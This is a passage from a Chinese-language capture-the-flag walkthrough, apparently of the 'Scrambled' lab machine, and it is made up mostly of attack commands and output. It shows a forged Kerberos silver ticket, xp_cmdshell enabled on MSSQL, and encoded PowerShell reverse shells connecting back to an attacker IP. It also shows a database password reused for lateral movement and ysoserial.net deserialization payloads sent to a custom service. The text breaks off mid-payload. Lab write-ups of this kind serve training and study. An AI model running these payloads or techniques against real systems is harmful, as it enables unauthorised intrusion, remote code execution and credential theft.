&quot;:B999A16500B87D17EC7F2E2A68778F05&quot;Domain SID: S-1-5-21-2743207045-1827831105-2542523200 然后开始制作银票 12345678910111213141516171819202122232425$ ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain dc1.scrm.local -dc-ip 10.10.11.168 -spn MSSQLSvc/dc1.scrm.local:1433 administratorImpacket v0.11.0 - Copyright 2023 Fortra[*] Creating basic skeleton ticket and PAC Infos/usr/bin/ticketer.py:129: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). aTime = timegm(datetime.datetime.utcnow().timetuple())[*] Customizing ticket for dc1.scrm.local/administrator/usr/bin/ticketer.py:480: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). encTicketPart[&#x27;authtime&#x27;] = KerberosTime.to_asn1(datetime.datetime.utcnow())/usr/bin/ticketer.py:481: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). encTicketPart[&#x27;starttime&#x27;] = KerberosTime.to_asn1(datetime.datetime.utcnow())/usr/bin/ticketer.py:483: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))[*] PAC_LOGON_INFO[*] PAC_CLIENT_INFO_TYPE[*] EncTicketPart/usr/bin/ticketer.py:606: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). encRepPart[&#x27;last-req&#x27;][0][&#x27;lr-value&#x27;] = KerberosTime.to_asn1(datetime.datetime.utcnow())[*] EncTGSRepPart[*] Signing/Encrypting final ticket[*] PAC_SERVER_CHECKSUM[*] PAC_PRIVSVR_CHECKSUM[*] EncTicketPart[*] EncTGSRepPart[*] Saving ticket in administrator.ccache logon mssql and enum and reverse通过银票看看能不能上mssql 123456789101112$ mssqlclient.py dc1.scrm.local -kImpacket v0.11.0 - Copyright 2023 Fortra[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(DC1): Line 1: Changed database context to &#x27;master&#x27;.[*] INFO(DC1): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commandsSQL (SCRM\\administrator dbo@master)&gt; ok，got it登了mssql，可以先看能不能打开xp_cmdshell 123SQL (SCRM\\administrator dbo@master)&gt; enable_xp_cmdshell;[*] INFO(DC1): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.[*] INFO(DC1): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install. 意外之喜反弹一下shell 12345678910# targetSQL (SCRM\\administrator dbo@master)&gt; xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAxACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==# attacker$ rlwrap -cAr nc -lvnp 9001Listening on 0.0.0.0 9001Connection received on 10.10.11.168 55474whoamiscrm\\sqlsvcPS C:\\Windows\\system32&gt; shell as sqlsvc先看users下面都有啥 123456789101112PS C:\\Users&gt; dir Directory: C:\\UsersMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 05/11/2021 21:28 administrator d----- 03/11/2021 19:31 miscsvc d-r--- 26/01/2020 17:54 Public d----- 01/06/2022 14:58 sqlsvc 这里再回去翻一下数据库 1234567891011121314151617181920212223242526SQL (SCRM\\administrator dbo@master)&gt; enum_db;name is_trustworthy_on ---------- ----------------- master 0 tempdb 0 model 0 msdb 1 ScrambleHR 0 SQL (SCRM\\administrator dbo@ScrambleHR)&gt; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = &#x27;BASE TABLE&#x27;;TABLE_NAME ---------- Employees UserImport Timesheets SQL (SCRM\\administrator dbo@ScrambleHR)&gt; select * from UserImport;LdapUser LdapPwd LdapDomain RefreshInterval IncludeGroups -------- ----------------- ---------- --------------- ------------- MiscSvc ScrambledEggs9900 scrm.local 90 0 有了miscsvc的密码，弹一个shell 12345678910PS C:\\Users\\sqlsvc\\desktop&gt; $SecPassword = ConvertTo-SecureString &#x27;ScrambledEggs9900&#x27; -AsPlainText -ForcePS C:\\Users\\sqlsvc\\desktop&gt; $Cred = New-Object System.Management.Automation.PSCredential(&#x27;scrm.local\\MiscSvc&#x27;, $SecPassword)PS C:\\Users\\sqlsvc\\desktop&gt; Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock &#123; powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAxACIALAA5ADAAMAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== &#125;$ rlwrap -cAr nc -lvnp 9002Listening on 0.0.0.0 9002Connection received on 10.10.11.168 55584whoamiscrm\\miscsvcPS C:\\Users\\miscsvc\\Documents&gt; shell as miscsvc看users下面，下一步应该就是administrator了（当然这种思想不对，应该仔细去想怎么横向，怎么枚举，怎么利用）在C盘下面有一个shares目录进去翻一下 12345678910111213141516171819202122232425262728293031323334353637383940PS C:\\Shares&gt; cd HRPS C:\\Shares\\HR&gt; dirPS C:\\Shares\\HR&gt; dir -hPS C:\\Shares\\HR&gt; cd ..PS C:\\Shares&gt; cd ITPS C:\\Shares\\IT&gt; dir Directory: C:\\Shares\\ITMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 03/11/2021 21:06 Apps d----- 03/11/2021 19:32 Logs d----- 03/11/2021 19:32 Reports PS C:\\Shares\\IT&gt; cd AppsPS C:\\Shares\\IT\\Apps&gt; dir Directory: C:\\Shares\\IT\\AppsMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 05/11/2021 20:57 Sales Order Client PS C:\\Shares\\IT\\Apps&gt; cd &quot;Sales Order Client&quot;PS C:\\Shares\\IT\\Apps\\Sales Order Client&gt; dir Directory: C:\\Shares\\IT\\Apps\\Sales Order ClientMode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 05/11/2021 20:52 86528 ScrambleClient.exe -a---- 05/11/2021 20:52 19456 ScrambleLib.dll 剩下两个文件夹倒是没有东西了，这个文件夹还是smb共享目录，那从smb下载吧dnspy打开dll文件看看如果勾选那个pdf中所说的enable log就会生成一个txt文件然后可以通过scrmdev登录的话就可以不需要密码了尝试了一下确实这个用户可以无密码登录，但是我的Windows虚拟机没有连接到vpn里面wine打开，凑活看一下，记得勾选那个日志功能看日志解一下看看解个jb，应该是经过序列化编译的接着翻反编译的吧上图中的new order部分对应应该是而uploadorder还在NewRequest部分被调用了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// Token: 0x0600002D RID: 45 RVA: 0x000025C8 File Offset: 0x000007C8public void UploadOrder(SalesOrder NewOrder)&#123; try &#123; Log.Write(&quot;Uploading new order with reference &quot; + NewOrder.ReferenceNumber); string text = NewOrder.SerializeToBase64(); Log.Write(&quot;Order serialized to base64: &quot; + text); ScrambleNetResponse scrambleNetResponse = this.SendRequestAndGetResponse(new ScrambleNetRequest(ScrambleNetRequest.RequestType.UploadOrder, text)); ScrambleNetResponse.ResponseType type = scrambleNetResponse.Type; if (type != ScrambleNetResponse.ResponseType.Success) &#123; throw new ApplicationException(scrambleNetResponse.GetErrorDescription()); &#125; Log.Write(&quot;Upload successful&quot;); &#125; catch (Exception ex) &#123; Log.Write(&quot;Error: &quot; + ex.Message); throw ex; &#125;&#125; // Token: 0x0600002E RID: 46 RVA: 0x00002664 File Offset: 0x00000864private ScrambleNetResponse SendRequestAndGetResponse(ScrambleNetRequest Request)&#123; Log.Write(&quot;Connecting to server&quot;); TcpClient tcpClient = new TcpClient(); tcpClient.ReceiveTimeout = checked((int)Math.Round(TimeSpan.FromSeconds(20.0).TotalMilliseconds)); tcpClient.ReceiveBufferSize = 2048; tcpClient.SendBufferSize = 2048; tcpClient.Connect(this.Server, this.Port); ScrambleNetResponse result; try &#123; using (NetworkStream stream = tcpClient.GetStream()) &#123; using (StreamWriter streamWriter = new StreamWriter(stream, Encoding.ASCII)) &#123; streamWriter.AutoFlush = true; if (this.GetResponse(stream).Type != ScrambleNetResponse.ResponseType.Banner) &#123; throw new ApplicationException(&quot;Unexpected response from server on initial connection&quot;); &#125; string text = ScrambleNetRequest.GetCodeFromMessageType(Request.Type) + &quot;;&quot; + Request.Parameter + &quot;\\n&quot;; Log.Write(&quot;Sending data to server: &quot; + text); streamWriter.Write(text); Log.Write(&quot;Getting response from server&quot;); ScrambleNetResponse response = this.GetResponse(stream); try &#123; byte[] bytes = Encoding.ASCII.GetBytes(&quot;QUIT\\n&quot;); stream.Write(bytes, 0, bytes.Length); stream.Close(); &#125; catch (Exception ex) &#123; Log.Write(&quot;Error sending QUIT and closing stream: &quot; + ex.Message); &#125; result = response; &#125; &#125; &#125; finally &#123; try &#123; tcpClient.Close(); &#125; catch (Exception ex2) &#123; Log.Write(&quot;Error closing TCP connection: &quot; + ex2.Message); &#125; &#125; return result;&#125; 这里会给4411端口发送序列化之后的数据，数据内容形式是ScrambleNetRequest.GetCodeFromMessageType(Request.Type) + &quot;;&quot; + Request.Parameter + &quot;\\n&quot;再翻相关调用可以发现，发送内容是UPLOAD_ORDER;&lt;序列化的内容&gt;，应用程序又是.net，序列化就用到ysoserial，这里我们用这个ysoserial.net先生成一个测试的payload 1234567891011C:\\Users\\liw\\Downloads\\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\\Release&gt;.\\ysoserial.exe -g DataSet -c &quot;cmd /c curl 10.10.16.11&quot; -f BinaryFormatter -o base64AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAAKQDAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxgU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNtZCAvYyBjdXJsIDEwLjEwLjE2LjExIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL$ nc 10.10.11.168 4411SCRAMBLECORP_ORDERS_V1.0.3;UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAAKQDAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxgU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNtZCAvYyBjdXJsIDEwLjEwLjE2LjExIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsLERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.$ sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.168 - - [06/May/2025 09:06:18] &quot;GET / HTTP/1.1&quot; 200 - 有效，上reverse shell 123456789101112C:\\Users\\liw\\Downloads\\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\\Release&gt;.\\ysoserial.exe -g DataSet -c &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAxACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot; -f BinaryFormatter -o base64AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAANMIAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA9Q88P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLWUgSkFCakFHd0FhUUJsQUc0QWRBQWdBRDBBSUFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFVd0I1QUhNQWRBQmxBRzBBTGdCT0FHVUFkQUF1QUZNQWJ3QmpBR3NBWlFCMEFITUFMZ0JVQUVNQVVBQkRBR3dBYVFCbEFHNEFkQUFvQUNJQU1RQXdBQzRBTVFBd0FDNEFNUUEyQUM0QU1RQXhBQ0lBTEFBNUFEQUFNQUF4QUNrQU93QWtBSE1BZEFCeUFHVUFZUUJ0QUNBQVBRQWdBQ1FBWXdCc0FHa0FaUUJ1QUhRQUxnQkhBR1VBZEFCVEFIUUFjZ0JsQUdFQWJRQW9BQ2tBT3dCYkFHSUFlUUIwQUdVQVd3QmRBRjBBSkFCaUFIa0FkQUJsQUhNQUlBQTlBQ0FBTUFBdUFDNEFOZ0ExQURVQU13QTFBSHdBSlFCN0FEQUFmUUE3QUhjQWFBQnBBR3dBWlFBb0FDZ0FKQUJwQUNBQVBRQWdBQ1FBY3dCMEFISUFaUUJoQUcwQUxnQlNBR1VBWVFCa0FDZ0FKQUJpQUhrQWRBQmxBSE1BTEFBZ0FEQUFMQUFnQUNRQVlnQjVBSFFBWlFCekFDNEFUQUJsQUc0QVp3QjBBR2dBS1FBcEFDQUFMUUJ1QUdVQUlBQXdBQ2tBZXdBN0FDUUFaQUJoQUhRQVlRQWdBRDBBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFJQUF0QUZRQWVRQndBR1VBVGdCaEFHMEFaUUF